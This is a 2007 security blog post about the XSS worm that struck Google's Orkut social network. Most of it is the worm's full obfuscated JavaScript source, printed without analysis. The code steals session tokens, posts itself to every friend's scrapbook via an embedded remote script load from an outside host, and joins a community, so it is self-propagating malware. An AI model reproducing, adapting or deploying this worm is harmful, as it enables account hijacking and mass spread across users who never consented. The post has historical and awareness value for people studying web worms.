---
title: The Orkut XSS Worm
author: petko-d-petkov
date: Wed, 19 Dec 2007 11:15:27 GMT
template: post.jade
category: fucked
---

Yep, Orkut, Google's Social Network, was hit by a XSS worm, the source of which you will be able to find at the bottom of this post. To be honest with you, it was about time. The trend for infecting social networks with Web2.0 malware will continue to increase during the following years. This is for sure! The simple fact is that social networks collect a lot of personal information which attackers can easily harvest for their own benefit.

The code is fairly simple and should be no brainier for you to find out what it does. So, this is the reason why I will skip the explanation step. The pre-processed details can be found out at [antrix.net](http://antrix.net/journal/techtalk/orkut_xss.html) website.

```javascript
function $(p,a,c,k,e,d) {
    e=function(c) {
        return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))
    };
    if(!''.replace(/^/,String)){
        while(c--){d[e(c)]=k[c]||e(c)}
        k=[function(e){return d[e]}];
        e=function(){return'\\w+'};
        c=1
    };
    while(c--){
        if(k[c]){
            p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])
        }
    }
    return p
};
setTimeout(
    $('5 j=0;5 q=1q["2o.H"];5 E=1q["2p.K.27"];7 B(){Z{b i 14("29.1l")}
    L(e){};Z{b i 14("2b.1l")}L(e){};Z{b i 2l()}L(e){};b J};
    7 W(g,P,m,c,9,U){5 1m=g+"="+19(P)+(m?"; m="+m.2f():"")+(c?"; c="+c:"")+(9?"; 9="+9:"")+(U?"; U":"");
    8.y=1m};7 v(g){5 l=8.y;5 A=g+"=";5 h=l.S("; "+A);6(h==-1){h=l.S(A);6(h!=0){b 2h}}16{h+=2};
    5 u=8.y.S(";",h);6(u==-1){u=l.M};b 2j(l.2m(h+A.M,u))};
    7 26(g,c,9){6(v(g)){8.y=g+"="+(c?"; c="+c:"")+(9?"; 9="+9:"")+"; m=1u, 1i-1v-1x 1g:1g:1i 1y";1U.1z(0)}};
    7 G(){5 3=B();6(3){3.R("1A","o://k.w.p/1B.z",C);3.a(J);3.Y=7(){6(3.X==4){6(3.1a==1c){5 1r=3.1Q;5 t=8.1n("t");
    t.1D=1r;5 f=t.D("f").O(0);6(f){f.1M(f.D("1F").O(0));f.1G("1H","N");f.1J.1K="1L";8.1N.1f(f);V()}}16{G()}}};
    3.a(J)}};7 T(){5 a="H="+n(q)+"&K="+n(E)+"&15.1O";5 3=B();3.R(\'q\',\'o://k.w.p/1P.z?1R=1S\',C);
    3.12(\'10-1e\',\'Q/x-k-17-1b\');3.a(a);3.Y=7(){6(3.X==4){6(3.1a!=1c){T();b};G()}}};
    7 V(){6(j==8.18("N").M){b};
    5 I="1V 1W 1X... 1Y 1Z 20 21 22 23 24<1k/>[1j]25 "+i F()+"[/1j]<1k/><13 1o=\\"o://k.w.p/28.z\\" 2a=\\"Q/x-2c-2d\\" 2e=\\"2g\');
    r=8.1n(\'r\');r.1o=\'o://1p.2k.p/2n/1p/1s.1t\';8.D(\'1w\')[0].1f(r);19(\'\\" 1C=\\"1\\" 1E=\\"1\\"></13>";
    5 a="15.1I=1&H="+n(q)+"&I="+n(I)+"&K="+n(E)+"&1T="+8.18("N").O(j).P;5 3=B();
    3.R("q","o://k.w.p/2i.z",C);3.12("10-1e","Q/x-k-17-1b;");
    3.a(a);3.Y=7(){6(3.X==4){j++;5 d=i F;d.1d(d.1h()+11);W(\'s\',j,d);V()}}};
    6(!v(\'s\')){5 d=i F;d.1d(d.1h()+11);W(\'s\',\'0\',d)};j=v(\'s\');T();
    ',62,150,'|||xml||var|if|function|document|domain|send|return|path|wDate||select|name|begin|new|index|
    www|dc|expires|encodeURIComponent|http|com|POST|script|wormdoorkut|div|end|getCookie|orkut||cookie|aspx
    |prefix|createXMLHttpRequest|true|getElementsByTagName|SIG|Date|loadFriends|POST_TOKEN|scrapText|null|
    signature|catch|length|selectedList|item|value|application|open|indexOf|cmm_join|secure|sendScrap|setCookie|
    readyState|onreadystatechange|try|Content|86400|setRequestHeader|embed|ActiveXObject|Action|else|form|
    getElementById|escape|status|urlencoded|200|setTime|Type|appendChild|00|getTime|01|silver|br|XMLHTTP|curCookie|
    createElement|src|files|JSHDF|xmlr|virus|js|Thu|Jan|head|70|GMT|go|GET|Compose|width|innerHTML|height|option|
    setAttribute|id|submit|style|display|none|removeChild|body|join|CommunityJoin|responseText|cmm|44001818|toUserId|
    history|2008|vem|ai|que|ele|comece|mto|bem|para|vc|RL|deleteCookie|raw|LoL|Msxml2|type|Microsoft|shockwave|flash|
    wmode|toGMTString|transparent|false|Scrapbook|unescape|myopera
    |XMLHttpRequest|substring|virusdoorkut|CGI|Page'.split('|'),0,{}),1
);
author="Rodrigo Lacerda"
```

So, there you go! Even if XSS is the lamest for of attack, you cannot deny its effectiveness.
